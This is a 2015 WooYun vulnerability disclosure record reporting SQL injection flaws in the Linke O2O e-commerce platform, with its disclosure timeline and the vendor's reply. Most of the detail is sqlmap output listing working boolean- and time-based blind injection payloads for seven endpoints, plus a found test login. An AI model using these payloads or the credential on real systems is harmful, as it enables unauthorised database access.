{"id": 79801, "wybug_id": "wooyun-2015-0157319", "wybug_title": "领客Linke O2O电商平台SQL注入漏洞", "wybug_corp": "领客Linke", "wybug_author": "chock", "wybug_date": "2015-12-05 02:12", "wybug_open_date": "2016-01-18 11:32", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入", "电商"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-18：\t细节向公众公开  简要描述： 几个注入漏洞打包一起提交吧 详细说明：  结合sqlmapapi写了个小公举，在浏览贵司的网站的时候检测到的，有些需要登录的情况恰好拾得一枚测试帐号\ntest/123456\n,也有些不需要登录也可以检测。目前发现的只有fs、bm、sf这几个域名存在注入漏洞，相信其他系统也存在，望贵司自查修复#1 http://**.**.**.**/tagInfo/manage/query  基于布尔值盲注\n{u'comment': u'', u'matchRatio': 0.007, u'title': u'MySQL >= 5.0 boolean-based blind - Parameter replace', u'templatePayload': None, u'vector': u'(SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))', u'where': 3, u'payload': u'pageNum=1&pageSize=10&name=&source=&behaviorAttr=&shopId=e9d84749-5f9c-4bd4-9847-495f9cabd42f&orderBy=(SELECT (CASE WHEN (4307=4307) THEN 4307 ELSE 4307*(SELECT 4307 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))'}\n#2 http://**.**.**.**/fansinfo/list-data  基于布尔值盲注\n{u'comment': u'', u'matchRatio': 0.019, u'title': u'MySQL >= 5.0 boolean-based blind - Parameter replace', u'templatePayload': None, u'vector': u'(SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))', u'where': 3, u'payload': u'pageNum=1&pageSize=10&mobile=&wxNickName=&fansSourceId=&minGrowup=&fansName=&maxGrowup=&storeId=&begin=&end=&orderBy=(SELECT (CASE WHEN (9094=9094) THEN 9094 ELSE 9094*(SELECT 9094 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))'}\n#3 http://**.**.**.**/user/list  基于时间盲注和基于布尔值盲注\n{u'comment': u'', u'matchRatio': 0.021, u'title': u'AND boolean-based blind - WHERE or HAVING clause', u'templatePayload': None, u'vector': u'AND [INFERENCE]', u'where': 1, u'payload': u\"userName=%' AND 9972=9972 AND '%'='&storeId=&nickName=&startDate=&endDate=&startIndex=1&pageSize=10&storeType=storeType\"}\n\n{u'comment': u'', u'matchRatio': 0.021, u'title': u'MySQL >= 5.0.12 AND time-based blind (SELECT)', u'templatePayload': None, u'vector': u'AND (SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])', u'where': 1, u'payload': u\"userName=%' AND (SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))eYIl) AND '%'='&storeId=&nickName=&startDate=&endDate=&startIndex=1&pageSize=10&storeType=storeType\"}\n#4 http://**.**.**.**/store/data  基于布尔值盲注\n{u'comment': u'', u'matchRatio': 0.018, u'title': u'AND boolean-based blind - WHERE or HAVING clause', u'templatePayload': None, u'vector': u'AND [INFERENCE]', u'where': 1, u'payload': u\"pageIndex=1&pageSize=10&name=%' AND 5373=5373 AND '%'='&type=\"}\n#5 http://**.**.**.**/shopAccount/data  基于布尔值盲注\n{u'comment': u'', u'matchRatio': 0.016, u'title': u'AND boolean-based blind - WHERE or HAVING clause', u'templatePayload': None, u'vector': u'AND [INFERENCE]', u'where': 1, u'payload': u\"pageIndex=1&pageSize=10&appName=%' AND 9213=9213 AND '%'='&startTime=&endTime=&status=\"}\n#6 http://**.**.**.**/event/search?tagId=1  基于布尔值盲注和时间盲注\n{u'comment': u'', u'matchRatio': 0.967, u'title': u'AND boolean-based blind - WHERE or HAVING clause', u'templatePayload': None, u'vector': u'AND [INFERENCE]', u'where': 1, u'payload': u'tagId=1 AND 8371=8371'}\n\n{u'comment': u'', u'matchRatio': 0.967, u'title': u'MySQL >= 5.0.12 AND time-based blind (SELECT)', u'templatePayload': None, u'vector': u'AND (SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])', u'where': 1, u'payload': u'tagId=1 AND (SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))fPPu)'}\n#7 http://**.**.**.**/event/search?tagId=1&cityId=440100&orderBy=latest&dateType=&beginTime=&endTime=&isFree=&more=3&keyWord=&number=1&totalPageNum=1  基于布尔值盲注\n{u'comment': u'', u'matchRatio': 0.06, u'title': u'MySQL >= 5.0 boolean-based blind - Parameter replace', u'templatePayload': None, u'vector': u'(SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))', u'where': 3, u'payload': u'tagId=(SELECT (CASE WHEN (9171=9171) THEN 9171 ELSE 9171*(SELECT 9171 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))&cityId=440100&orderBy=latest&dateType=&beginTime=&endTime=&isFree=&more=3&keyWord=&number=1&totalPageNum=1'}\n   漏洞证明：  象征性列一下有哪些库和表，并没有拖库，因为太累\n\n\n\n   修复方案：  做过滤或者预编译   版权声明：转载请注明来源 chock@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2015-12-09 18:18 厂商回复： CNVD未直接复现所述漏洞情况，暂未建立与网站管理单位的直接处置渠道，待认领。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}